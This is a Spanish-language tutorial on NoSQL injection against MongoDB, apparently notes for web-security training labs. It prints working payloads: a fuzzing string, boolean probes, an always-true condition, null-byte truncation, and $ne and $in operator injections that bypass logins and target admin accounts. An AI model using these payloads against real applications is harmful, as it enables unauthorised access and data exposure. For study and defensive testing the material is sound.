# NoSQL Injection



Una **NoSQL Injection** es una vulnerabilidad de seguridad que permite a un atacante manipular las consultas realizadas por una aplicación hacia una base de datos NoSQL. A diferencia de las bases de datos relacionales SQL, las NoSQL (como MongoDB, CouchDB, Firebase, etc.) utilizan distintos lenguajes de consulta, estructuras de datos flexibles y menos restricciones relacionales.

Esta vulnerabilidad puede permitir a un atacante:

* Bypassear mecanismos de autenticación o autorización.
* Leer, modificar o eliminar datos arbitrarios.
* Ejecutar código en el servidor (en algunos entornos).
* Causar denegación de servicio.

---

## 🧰 ¿Cómo funciona?

Las aplicaciones modernas muchas veces reciben datos del cliente (formularios, URLs, JSON) que luego utilizan para construir consultas hacia la base de datos. Si estos datos no son validados correctamente, un atacante podría inyectar fragmentos de código malicioso que se ejecuten como parte de la consulta NoSQL.

---

## ✍️ Tipos de NoSQL Injection

### 1. Inyección de Sintaxis (Syntax Injection)

El atacante puede modificar la sintaxis de la consulta con caracteres especiales, logrando alterar su comportamiento.

Ejemplo:

```js
// Consulta en MongoDB:
db.products.find({ category: userInput })
```

Si `userInput` es:

```js
"fizzy'||'1'=='1"
```

Entonces la consulta queda:

```js
{ category: 'fizzy'||'1'=='1' }
```

Esto puede devolver todos los productos sin importar su categoría.

### 2. Inyección de Operadores (Operator Injection)

El atacante utiliza operadores de la base NoSQL como `$ne`, `$gt`, `$regex`, `$where`, etc., para alterar la consulta sin romper la sintaxis.

Ejemplo:

```json
{
  "username": { "$ne": null },
  "password": { "$ne": null }
}
```

Esto puede saltarse una autenticación básica si no se sanitizan los campos.

---

## 🔢 MongoDB como objetivo principal

MongoDB es una de las bases de datos NoSQL más utilizadas y es muy propensa a este tipo de vulnerabilidades cuando se trabaja con datos JSON desde el cliente.

### Consulta común:

```js
// URL:
https://inseguro.com/product/lookup?category=fizzy

// Query que ejecuta:
this.category == 'fizzy'
```

---

## 🔍 Detectando NoSQL Injection (fuzzing)

### Prueba con cadenas especiales:

Probar si el input del parámetro `category` permite alterar la sintaxis:

```
category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```

Versión decodificada:

```js
"`{
;$Foo}
$Foo \xYZ\0
```

Cambios inesperados en la respuesta pueden indicar procesamiento no seguro del input.

### Prueba con comillas simples:

```
category='
```

Consulta generada:

```
this.category == '''
```

Si se rompe la consulta, podría indicar un punto de inyección.

---

## 🔠 Confirmando comportamiento condicional

Una técnica común es inyectar condiciones booleanas:

* Falsa:

```
fizzy' && 0 && 'x
```

* Verdadera:

```
fizzy' && 1 && 'x
```

Si la aplicación responde distinto para ambas, entonces el input modifica la lógica del servidor.

---

## 🔫 Anulando condiciones

Una vez que se sabe que la inyección funciona, se puede intentar inyectar una condición siempre verdadera:

Payload:

```
fizzy'||'1'=='1
```

URL codificada:

```
category=fizzy%27%7c%7c%271%27%3d%3d%271
```

Consulta resultante:

```
this.category == 'fizzy' || '1'=='1'
```

---

[Lab: Detecting NoSQL injection](1_Detecting_NoSQL_injection.md)  

![Practitioner](https://img.shields.io/badge/level-Apprentice-green) 

---

## 🧪 Truncamiento mediante null byte (\u0000)

Una técnica interesante en ataques NoSQL consiste en utilizar un carácter nulo (`%00`) para truncar la consulta y evitar que se evalúen condiciones adicionales.

### 🔎 Ejemplo práctico

Supongamos que la aplicación realiza una consulta como la siguiente:

```js
this.category == 'fizzy' && this.released == 1
```

Esta lógica busca mostrar solo productos oficialmente lanzados (`released`). Sin embargo, si el atacante logra inyectar un carácter nulo (`\u0000`), es posible anular la segunda condición, por ejemplo mediante la siguiente URL:

```arduino
https://insecure-website.com/product/lookup?category=fizzy'%00
```

El motor de consulta interpretaría:

```js
this.category == 'fizzy'\u0000' && this.released == 1
```

Y debido a que MongoDB y algunos lenguajes de backend ignoran todo lo posterior al null byte, se omite la condición `this.released == 1`, mostrando también los productos no lanzados (`released == 0`).

### 🧠 Consideraciones

* Este ataque depende de cómo el backend maneja los caracteres nulos.
* Muchos lenguajes modernos ya no permiten `\u0000` en strings, pero aún existen casos reales donde funciona.
* Es ideal para bypassear filtros booleanos adicionales, sin romper la sintaxis.

---

## ⚙️ Inyección de operadores NoSQL

Las bases de datos NoSQL, como MongoDB, utilizan operadores especiales para definir condiciones más complejas dentro de sus consultas. Algunos de los más comunes son:

| Operador | Descripción                            |
| -------- | -------------------------------------- |
| `$where` | Ejecuta una expresión JavaScript       |
| `$ne`    | Distinto de...                         |
| `$in`    | Pertenencia a un array                 |
| `$regex` | Coincidencia con una expresión regular |

Si la aplicación no valida correctamente los datos del usuario, es posible inyectar estos operadores directamente y alterar la lógica de la consulta.

### 📤 Inyectando operadores desde el cliente

#### 🔧 En JSON (cuerpo de POST)

Petición legítima:

```json
{
  "username": "wiener",
  "password": "peter"
}
```

Inyección con `$ne`:

```json
{
  "username": { "$ne": "invalid" },
  "password": "peter"
}
```

Esto selecciona usuarios cuyo nombre no sea `invalid`, y cuya contraseña sea `peter`.

Si ambos campos permiten operadores, se puede bypassear el login con:

```json
{
  "username": { "$ne": "invalid" },
  "password": { "$ne": "invalid" }
}
```

Esto coincidirá con cualquier usuario válido, ya que las condiciones siempre se cumplen.

### 🎯 Targeteando usuarios específicos

También es posible apuntar a roles como admin con:

```json
{
  "username": { "$in": ["admin", "administrator", "superadmin"] },
  "password": { "$ne": "" }
}
```

Esto devuelve cualquier usuario con uno de esos nombres y contraseña no vacía.

### 🌐 Inyección vía parámetros de URL

Si la app recibe datos vía GET:

```bash
username[$ne]=admin&password[$ne]=1234
```

Esto intenta construir un objeto anidado para inyectar `$ne`.

En caso de que la app no procese adecuadamente esta estructura, se recomienda:

* Cambiar a POST.
* Establecer `Content-Type: application/json`.
* Inyectar el payload como JSON en el cuerpo.

💡 **Consejo**: En Burp Suite, la extensión **Content Type Converter** puede facilitar esta transformación automáticamente.
---

[Lab: Detecting NoSQL injection](1_Detecting_NoSQL_injection.md)

![Practitioner](https://img.shields.io/badge/level-Apprentice-green)

---


